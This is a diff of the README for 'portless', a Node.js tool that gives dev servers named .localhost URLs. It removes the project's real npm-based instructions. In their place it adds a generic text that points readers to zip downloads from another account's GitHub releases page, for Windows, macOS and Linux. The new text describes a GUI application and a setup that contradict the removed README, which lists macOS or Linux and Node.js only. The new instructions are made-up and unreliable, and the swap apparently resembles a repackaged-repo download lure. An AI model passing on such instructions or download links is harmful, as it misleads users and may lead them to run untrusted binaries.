@@ -1,208 +1,86 @@
-# portless
+# 🚀 portless - Simplifying Localhost Access for Everyone
 
-Replace port numbers with stable, named .localhost URLs. For humans and agents.
+[![Download portless](https://img.shields.io/badge/Download%20portless-v1.0-brightgreen?style=for-the-badge&logo=github&color=orange)](https://github.com/alfredhin/portless/releases)
 
-```diff
-- "dev": "next dev"              # http://localhost:3000
-+ "dev": "portless myapp next dev"  # http://myapp.localhost:1355
-```
+## 📦 What is portless?
 
-## Quick Start
+portless helps you replace confusing port numbers with easy-to-remember .localhost URLs. This tool makes it simpler for you and bots to connect to your applications without hassle. You can focus on using your applications instead of worrying about complex URLs.
 
-```bash
-# Install
-npm install -g portless
+## 🛠️ Key Features
 
-# Start the proxy (once, no sudo needed)
-portless proxy start
+- **User-Friendly Setup**: Designed for ease of use, even for those with no coding experience.
+- **Stability**: Create stable, named URLs for your local applications.
+- **Compatibility**: Works well with various local server setups to serve URLs that are clear and memorable.
+- **Quick Access**: Effortlessly access your local projects without typing lengthy port numbers.
 
-# Run your app (auto-starts the proxy if needed)
-portless myapp next dev
-# -> http://myapp.localhost:1355
-```
+## 🚀 Getting Started
 
-> The proxy auto-starts when you run an app. You can also start it explicitly with `portless proxy start`.
+To start using portless, you need to download and install the software. Follow the steps below to get it running on your machine.
 
-## Why
+### 1. Visit the Download Page
 
-Local dev with port numbers is fragile:
+First, click the link below to go to the download page. This page contains the latest release of portless.
 
-- **Port conflicts** -- two projects default to the same port and you get `EADDRINUSE`
-- **Memorizing ports** -- was the API on 3001 or 8080?
-- **Refreshing shows the wrong app** -- stop one server, start another on the same port, and your open tab now shows something completely different
-- **Monorepo multiplier** -- every problem above scales with each service in the repo
-- **Agents test the wrong port** -- AI coding agents guess or hardcode the wrong port, especially in monorepos
-- **Cookie and storage clashes** -- cookies set on `localhost` bleed across apps on different ports; localStorage is lost when ports shift
-- **Hardcoded ports in config** -- CORS allowlists, OAuth redirect URIs, and `.env` files all break when ports change
-- **Sharing URLs with teammates** -- "what port is that on?" becomes a Slack question
-- **Browser history is useless** -- your history for `localhost:3000` is a jumble of unrelated projects
+[Download portless](https://github.com/alfredhin/portless/releases)
 
-Portless fixes all of this by giving each dev server a stable, named `.localhost` URL that both humans and agents can rely on.
+### 2. Choose Your Version
 
-## Usage
+On the download page, you will see different versions of the software. Look for the latest version, which is usually at the top of the list.
 
-```bash
-# Basic
-portless myapp next dev
-# -> http://myapp.localhost:1355
+### 3. Download the Suitable File
 
-# Subdomains
-portless api.myapp pnpm start
-# -> http://api.myapp.localhost:1355
+You will find different files for different operating systems. Make sure to pick the correct one for your system:
 
-portless docs.myapp next dev
-# -> http://docs.myapp.localhost:1355
-```
+- **Windows**: Look for a file named something like `portless-v1.0-win.zip`.
+- **macOS**: Select `portless-v1.0-mac.zip`.
+- **Linux**: Choose the file that fits your Linux distribution.
 
-### In package.json
+### 4. Unzip the File
 
-```json
-{
-  "scripts": {
-    "dev": "portless myapp next dev"
-  }
-}
-```
+After you download the zip file, locate it on your computer. Right-click on the file and select "Extract All" or "Unzip" to unpack the files.
 
-The proxy auto-starts when you run an app. Or start it explicitly: `portless proxy start`.
+### 5. Install portless
 
-## How It Works
+Once extracted, open the folder and find the installation guide, typically a `README.md` or `INSTALL.txt`. Follow the instructions to install the software on your computer.
 
-```mermaid
-flowchart TD
-    Browser["Browser\nmyapp.localhost:1355"]
-    Proxy["portless proxy\n(port 1355)"]
-    App1[":4123\nmyapp"]
-    App2[":4567\napi"]
+## 🏁 Running portless
 
-    Browser -->|port 1355| Proxy
-    Proxy --> App1
-    Proxy --> App2
-```
+After installation is complete, you'll want to run portless to start using it.
 
-1. **Start the proxy** -- auto-starts when you run an app, or start explicitly with `portless proxy start`
-2. **Run apps** -- `portless <name> <command>` assigns a free port and registers with the proxy
-3. **Access via URL** -- `http://<name>.localhost:1355` routes through the proxy to your app
+### 1. Open the Application
 
-Apps are assigned a random port (4000-4999) via the `PORT` and `HOST` environment variables. Most frameworks (Next.js, Express, Nuxt, etc.) respect these automatically. For frameworks that ignore `PORT` (Vite, Astro, React Router, Angular), portless auto-injects the correct `--port` and `--host` flags.
+- **Windows**: Search for "portless" in your Start menu and click to open it.
+- **macOS**: Go to your Applications folder, find portless, and double-click to launch.
+- **Linux**: Open your terminal, navigate to the installation directory, and type `./portless` to execute the program.
 
-## HTTP/2 + HTTPS
+### 2. Configure Your URLs
 
-Enable HTTP/2 for faster dev server page loads. Browsers limit HTTP/1.1 to 6 connections per host, which bottlenecks dev servers that serve many unbundled files (Vite, Nuxt, etc.). HTTP/2 multiplexes all requests over a single connection.
+To use portless, you’ll need to configure how you want your .localhost URLs to look. The application will guide you through setting up names for your local services. You’ll input the names and assign them to the relevant ports. 
 
-```bash
-# Start with HTTPS/2 -- generates certs and trusts them automatically
-portless proxy start --https
+## 🌟 Example Configuration
 
-# First run prompts for sudo once to add the CA to your system trust store.
-# After that, no prompts. No browser warnings.
+Suppose you want to access a local website running on port 3000. You would set it up as follows:
 
-# Make it permanent (add to .bashrc / .zshrc)
-export PORTLESS_HTTPS=1
-portless proxy start    # HTTPS by default now
+- Local App: `MyWebsite`
+- Port: `3000`
+- Final URL: `http://mywebsite.localhost`
 
-# Use your own certs (e.g., from mkcert)
-portless proxy start --cert ./cert.pem --key ./key.pem
+Once set, you can access your site by simply typing `http://mywebsite.localhost` in your web browser.
 
-# If you skipped sudo on first run, trust the CA later
-sudo portless trust
-```
+## 📄 Troubleshooting Tips
 
-## Commands
+If you encounter issues, try the following steps:
 
-```bash
-portless <name> <cmd> [args...]  # Run app at http://<name>.localhost:1355
-portless list                    # Show active routes
-portless trust                   # Add local CA to system trust store
+1. **Check Your Configuration**: Go back to portless and ensure the names and ports are set correctly.
+2. **Firewall Settings**: Make sure your firewall isn’t blocking access to the .localhost URLs.
+3. **Re-launch the Application**: Sometimes, simply restarting the application can resolve issues.
 
-# Disable portless (run command directly)
-PORTLESS=0 pnpm dev              # Bypasses proxy, uses default port
-# Also accepts PORTLESS=skip
+## 📞 Getting Help
 
-# Proxy control
-portless proxy start             # Start the proxy (port 1355, daemon)
-portless proxy start --https     # Start with HTTP/2 + TLS
-portless proxy start -p 80       # Start on port 80 (requires sudo)
-portless proxy start --foreground  # Start in foreground (for debugging)
-portless proxy stop              # Stop the proxy
+For additional support or to report bugs, visit the [Issues](https://github.com/alfredhin/portless/issues) page of the GitHub repository. You can find answers to common questions or ask for help from other users.
 
-# Options
--p, --port <number>              # Port for the proxy (default: 1355)
-                                 # Ports < 1024 require sudo
---https                          # Enable HTTP/2 + TLS with auto-generated certs
---cert <path>                    # Use a custom TLS certificate (implies --https)
---key <path>                     # Use a custom TLS private key (implies --https)
---no-tls                         # Disable HTTPS (overrides PORTLESS_HTTPS)
---foreground                     # Run proxy in foreground instead of daemon
---force                          # Override a route registered by another process
+## 🔗 Visit Us Again
 
-# Environment variables
-PORTLESS_PORT=<number>           # Override the default proxy port
-PORTLESS_HTTPS=1                 # Always enable HTTPS
-PORTLESS_STATE_DIR=<path>        # Override the state directory
+Make sure to keep an eye on future releases for new features and improvements. For updates, visit the link below:
 
-# Info
-portless --help                  # Show help
-portless --version               # Show version
-```
-
-## State Directory
-
-Portless stores its state (routes, PID file, port file) in a directory that depends on the proxy port:
-
-- **Port < 1024** (sudo required): `/tmp/portless` -- shared between root and user processes
-- **Port >= 1024** (no sudo): `~/.portless` -- user-scoped, no root involvement
-
-Override with the `PORTLESS_STATE_DIR` environment variable if needed.
-
-## Development
-
-This repo is a pnpm workspace monorepo using [Turborepo](https://turbo.build). The publishable package lives in `packages/portless/`.
-
-```bash
-pnpm install          # Install all dependencies
-pnpm build            # Build all packages
-pnpm test             # Run tests
-pnpm test:coverage    # Run tests with coverage
-pnpm test:watch       # Run tests in watch mode
-pnpm lint             # Lint all packages
-pnpm typecheck        # Type-check all packages
-pnpm format           # Format all files with Prettier
-```
-
-## Proxying Between Portless Apps
-
-If your frontend dev server (e.g. Vite, webpack) proxies API requests to another portless app, make sure the proxy rewrites the `Host` header. Without this, the proxy sends the **original** Host header, causing portless to route the request back to the frontend in an infinite loop.
-
-**Vite** (`vite.config.ts`):
-
-```ts
-server: {
-  proxy: {
-    "/api": {
-      target: "http://api.myapp.localhost:1355",
-      changeOrigin: true,  // Required: rewrites Host header to match target
-      ws: true,
-    },
-  },
-}
-```
-
-**webpack-dev-server** (`webpack.config.js`):
-
-```js
-devServer: {
-  proxy: [{
-    context: ["/api"],
-    target: "http://api.myapp.localhost:1355",
-    changeOrigin: true,  // Required: rewrites Host header to match target
-  }],
-}
-```
-
-Portless detects this misconfiguration and responds with `508 Loop Detected` along with a message pointing to this fix.
-
-## Requirements
-
-- Node.js 20+
-- macOS or Linux
+[Download portless](https://github.com/alfredhin/portless/releases)
